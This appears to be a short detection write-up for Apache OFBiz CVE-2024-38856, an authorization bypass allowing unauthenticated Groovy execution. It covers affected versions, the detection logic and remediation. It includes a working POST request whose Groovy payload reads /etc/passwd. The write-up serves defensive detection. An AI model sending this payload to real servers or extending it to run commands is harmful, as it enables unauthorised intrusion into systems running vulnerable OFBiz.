# Apache OFBiz CVE-2024-38856 improper authorization

**CVE-2024-38856** is an improper authorization issue (CWE-863) in Apache OFBiz
through 18.12.14. The `main` endpoint's permission check does not cover an
appended override view, so a request to
`/webtools/control/main/ProgramExport` renders the unauthenticated
`ProgramExport` screen and executes an attacker-supplied Groovy program.

```
POST /webtools/control/main/ProgramExport
Content-Type: application/x-www-form-urlencoded

groovyProgram=throw new Exception(new File("/etc/passwd").text)
```

## Affected and fixed versions
Apache OFBiz **through 18.12.14**; fixed in **18.12.15**.

## How the detection confirms it
The check sends the override-view request with a benign `groovyProgram` that
reads the world-readable `/etc/passwd` instead of running a command, and
requires the `root:...:0:0:` account prefix and HTTP 200 in the response. A
control request to a non-existent screen must not return the account prefix. No
OS command is run, nothing is written and redirects are not followed.

## Remediation
Upgrade Apache OFBiz to 18.12.15 or later and require authentication on
screen-rendering controllers.
